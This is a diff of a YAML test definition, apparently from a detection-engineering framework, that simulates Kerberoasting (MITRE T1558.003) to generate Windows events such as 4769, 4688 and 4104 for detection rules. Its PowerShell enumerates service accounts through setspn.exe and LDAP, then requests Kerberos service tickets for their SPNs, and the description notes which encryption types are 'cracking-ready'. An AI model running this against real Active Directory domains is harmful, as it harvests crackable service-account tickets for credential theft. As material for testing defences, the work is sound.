@@ -1,70 +1,69 @@
 id: T1558.003
 name: Kerberoasting — Service Ticket Request
-description: Requests Kerberos service tickets for accounts with SPNs registered, simulating Kerberoasting reconnaissance. Generates Event 4769 (Kerberos service ticket request) — Exabeam has 22 rules for this technique.
+description: Uses native .NET KerberosRequestorSecurityToken (the same class PowerView's Invoke-Kerberoast uses internally) to request Kerberos TGS tickets for SPN-registered accounts. setspn.exe SPN enumeration generates EID 4688. On the DC, EID 4769 with EncryptionType=0x17 (RC4-HMAC) is the canonical Kerberoasting indicator — AES256 (0x12) = normal; RC4 (0x17) = cracking-ready downgrade. Exabeam has 22 rules.
 tactic: credential-access
 technique_id: T1558.003
 platform: windows
 phase: attack
 elevation_required: false
 expected_events:
-  - "4769 (Kerberos service ticket request — key Kerberoasting indicator)"
-  - "4768 (Kerberos TGT request)"
-  - "4688 (powershell.exe process creation)"
-  - "4104 (PowerShell ScriptBlock - SPN enumeration)"
+  - "4769 on DC (Kerberos TGS request - TicketEncryptionType=0x17 RC4 = Kerberoasting indicator)"
+  - "4688 / Sysmon 1 (setspn.exe with -T -Q */* arguments)"
+  - "4104 (PowerShell ScriptBlock - KerberosRequestorSecurityToken / LDAP SPN enumeration)"
 tags:
   - credential-access
-  - kerberos
+  - active-directory
   - no-prereqs
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1558.003] Kerberoasting - Service Principal Name enumeration and ticket request"
+  command: |-
+    Write-Host "[T1558.003] Kerberoasting — SPN enumeration + TGS ticket request"
 
-    # Step 1: Enumerate accounts with SPNs (AD reconnaissance for Kerberoasting targets)
-    Write-Host "--- Step 1: SPN Enumeration (LDAP query for kerberoastable accounts) ---"
+    # Step 1: setspn.exe SPN enumeration (EID 4688 for setspn.exe)
+    Write-Host "--- Step 1: SPN enumeration via setspn.exe (EID 4688) ---"
+    setspn.exe -T $env:USERDNSDOMAIN -Q */* 2>&1 | Select-Object -First 20 | Write-Host
+
+    # Step 2: LDAP SPN enumeration — service accounts with SPNs (Kerberoasting targets)
+    Write-Host "--- Step 2: LDAP SPN enumeration (EID 4104 + LDAP query on DC) ---"
     try {
-        $spnAccounts = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll()
-        if ($spnAccounts.Count -gt 0) {
-            Write-Host "Found $($spnAccounts.Count) account(s) with SPNs registered:"
-            foreach ($acc in $spnAccounts) {
-                $sam = $acc.Properties["samaccountname"][0]
-                $spns = $acc.Properties["serviceprincipalname"]
-                Write-Host "  User: $sam | SPNs: $($spns -join ', ')"
-            }
-        } else {
-            Write-Host "No SPN accounts found (likely not domain-joined). Simulating with computer SPNs."
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher
+        $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+        $searcher.PropertiesToLoad.AddRange(@("servicePrincipalName","sAMAccountName","distinguishedName"))
+        $results = $searcher.FindAll()
+        Write-Host "SPN-enabled accounts found: $($results.Count)"
+        $results | ForEach-Object {
+            $acct = $_.Properties["samaccountname"]
+            $_.Properties["serviceprincipalname"] | ForEach-Object { Write-Host "  SPN: $_ (account: $acct)" }
         }
-    } catch {
-        Write-Host "LDAP SPN query failed (not domain-joined or insufficient access): $_"
+    } catch { Write-Host "LDAP SPN enumeration: $_" }
+
+    # Step 3: KerberosRequestorSecurityToken TGS request
+    # This generates EID 4769 on DC with EncryptionType=0x17 if account supports RC4
+    Write-Host "--- Step 3: KerberosRequestorSecurityToken TGS request (EID 4769 on DC) ---"
+    Add-Type -AssemblyName System.IdentityModel
+    $spnsToRequest = @()
+
+    # Request tickets for found SPNs
+    if ($results -and $results.Count -gt 0) {
+        foreach ($r in $results) {
+            foreach ($spn in $r.Properties["serviceprincipalname"]) {
+                $spnsToRequest += $spn
+            }
+        }
+    }
+    # Always try local machine SPNs as fallback
+    $spnsToRequest += "HOST/$env:COMPUTERNAME", "HOST/$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+
+    foreach ($spn in ($spnsToRequest | Select-Object -First 5)) {
+        try {
+            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+            Write-Host "  TGS requested for: $spn (EID 4769 on DC — check EncryptionType field)"
+        } catch { Write-Host "  SPN skip: $spn ($_)" }
     }
 
-    # Step 2: Request service tickets for discovered SPNs (generates Event 4769)
-    Write-Host "--- Step 2: Requesting Kerberos service tickets for SPNs ---"
-    try {
-        $spns = ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll() |
-                ForEach-Object { $_.Properties["serviceprincipalname"] } |
-                Where-Object { $_ -notmatch "^kadmin" }
-        if ($spns) {
-            foreach ($spn in ($spns | Select-Object -First 5)) {
-                Write-Host "  Requesting ticket for SPN: $spn"
-                Add-Type -AssemblyName System.IdentityModel
-                try {
-                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
-                    Write-Host "  Ticket obtained: $($ticket.Id) — Event 4769 generated"
-                } catch {
-                    Write-Host "  Ticket request failed for $spn`: $_"
-                }
-            }
-        } else {
-            Write-Host "No domain SPNs available. On domain-joined system Event 4769 would fire here."
-        }
-    } catch {
-        Write-Host "Kerberos ticket request phase: $_"
-    }
+    # Step 4: klist to show acquired tickets
+    Write-Host "--- Step 4: klist — acquired Kerberos tickets ---"
+    klist 2>&1 | Select-String "Service Name|Encryption Type|KerbTicket" | Write-Host
 
-    # Step 3: klist to show cached tickets (generates 4104 ScriptBlock log)
-    Write-Host "--- Step 3: Listing cached Kerberos tickets (klist) ---"
-    klist 2>&1 | Select-String -Pattern "Service|Principal|Ticket" | Select-Object -First 10
-
-    Write-Host "[T1558.003] Complete. Event 4769 generated for each SPN ticket request (domain systems)."
+    Write-Host "[T1558.003] Complete. EID 4769 on DC: EncryptionType=0x17 (RC4) = Kerberoastable."
 cleanup: ""
